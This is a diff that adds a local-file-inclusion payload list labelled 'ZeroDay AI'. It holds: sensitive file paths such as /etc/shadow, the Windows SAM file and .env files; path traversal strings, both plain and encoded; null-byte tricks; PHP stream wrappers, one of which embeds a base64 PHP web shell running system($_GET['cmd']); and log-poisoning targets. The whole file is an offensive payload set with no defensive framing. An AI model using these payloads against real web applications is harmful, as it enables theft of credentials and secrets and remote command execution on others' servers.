@@ -1,0 +1,102 @@
+# LFI (Local File Inclusion) Payloads — ZeroDay AI
+# ──────────────────────────────────────────────────
+
+# Linux targets
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/etc/group
+/etc/issue
+/etc/motd
+/etc/os-release
+/etc/resolv.conf
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/fd/0
+/proc/version
+/proc/net/tcp
+/var/log/auth.log
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+/var/log/mail.log
+/var/www/html/index.php
+/var/www/html/.env
+
+# Windows targets
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\win.ini
+C:\Windows\System32\config\SAM
+C:\boot.ini
+C:\Windows\debug\NetSetup.log
+C:\inetpub\wwwroot\web.config
+C:\Program Files\Apache Group\Apache\conf\httpd.conf
+
+# Path traversal (Linux)
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+
+# Path traversal (Windows)
+..\windows\win.ini
+..\..\windows\win.ini
+..\..\..\windows\win.ini
+
+# Encoded traversal
+..%2Fetc%2Fpasswd
+..%252Fetc%252Fpasswd
+%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/etc/passwd
+..%c0%afetc%c0%afpasswd
+..%c1%9cetc%c1%9cpasswd
+
+# Null byte (older PHP)
+/etc/passwd%00
+/etc/passwd%00.jpg
+/etc/passwd\x00
+
+# PHP wrappers
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=/etc/passwd
+php://input
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+expect://id
+php://temp
+php://memory
+php://fd/0
+php://filter/string.rot13/resource=index.php
+php://filter/zlib.deflate/resource=index.php
+# Java/other wrappers
+jar:http://localhost!/
+zip://index.zip#index.php
+phar://index.phar/index.php
+# Log poisoning targets
+/var/log/httpd/access_log
+/var/log/httpd/error_log
+/var/log/lighttpd/access.log
+/var/log/vsftpd.log
+/var/log/sshd.log
+/var/log/mail
+/var/log/syslog
+/var/log/messages
+/var/log/audit/audit.log
+/proc/self/mounts
+/proc/self/status
+/proc/self/net/arp
+/proc/self/net/route
+/proc/self/maps
+/proc/sched_debug
+/proc/net/fib_trie
+/proc/net/dev
+/proc/net/tcp
+/proc/net/udp
+/proc/net/unix
+/proc/net/route
+/proc/net/rpc/nfsd
+/proc/net/rpc/nfs
+/proc/net/rpc/mountd
